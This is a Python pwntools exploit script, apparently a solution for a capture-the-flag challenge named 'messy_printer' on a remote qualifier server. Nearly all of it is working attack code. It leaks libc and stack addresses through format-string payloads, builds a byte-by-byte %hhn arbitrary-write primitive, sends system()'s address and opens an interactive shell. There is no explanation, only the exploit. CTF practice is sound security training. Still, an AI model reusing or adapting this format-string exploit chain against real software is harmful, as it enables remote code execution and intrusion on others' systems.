from Crypto.Util.number import *
from pwn import *

# r = process('./messy_printer')
r = remote('eofqual.zoolab.org', 4001)

offset = 0x270b3

def Leak(fmt):
    global r
    r.sendafter('[y/n]: \n', b'y')
    r.sendlineafter('title: \n', b'jizz7122')

    x = int.from_bytes(r.recvuntil('\nGive', drop=True), 'big') # N - M^3
    y = int.from_bytes(b'jizz7122', 'big') # M^3

    N = x + y ** 3

    r.sendlineafter('content: ', fmt)
    x = int.from_bytes(r.recvuntil('\nContinue', drop=True)[1:], 'big')
    y = N - x

    L = 0
    R = y
    while R - L > 1:
        mid = (L + R) // 2
        if mid * mid * mid <= y:
            L = mid
        else:
            R = mid
    assert L * L * L == y
    buf = int.to_bytes(L, 14, 'big')
    return buf

libc_base = int(Leak(b'%21$p'), 16) - offset
system_offset = libc_base + 0x55410
print(hex(libc_base))

rbp2 = int(Leak(b'%23$p'), 16)
rbp3 = int(Leak(b'%51$p'), 16)
rsp = int(Leak(b'%12$p'), 16) - 0x80

rbp3 -= rbp3 % 16

print("rbp2", hex(rbp2))
print("rbp3", hex(rbp3))
print("rsp", hex(rsp))


assert rbp3 > rbp2
diff = (rbp3 - rbp2) // 8 + 51

def write_value(pointer, value):
    for i in range(8):
        byte = value & 0xff
        write_rbp3(pointer + i)
        write_to_rbp3(byte)
        value >>= 8

def write_rbp3(value):
    for i in range(8):
        byte = value & 0xff
        set_rbp2(i)
        write_to_rbp2(byte)
        value >>= 8

def write_to_buffer(value, offset):
    if value == 0:
        fmt = f"%{offset}$hhn".encode("utf-8")
    else:
        fmt = f"%{value}c%{offset}$hhn".encode("utf-8")

    r.sendafter('[y/n]: \n', b'y')
    r.sendlineafter('title: \n', fmt)
    r.recvuntil('\nGive', drop=True)
    r.sendlineafter('content: ', b'jizz7122')


def set_rbp2(value):
    byte = (rbp3 & 0xff) + value
    write_to_buffer(byte, 23)

def write_to_rbp2(value):
    write_to_buffer(value, 51)

def write_to_rbp3(value):
    write_to_buffer(value, diff)

# write_value(rsp + 0x68, system_offset)

# target: the 17-th argument to snprintf

r.sendafter('[y/n]: \n', b'n')
r.sendafter('magic: \n', p64(system_offset))
r.interactive()
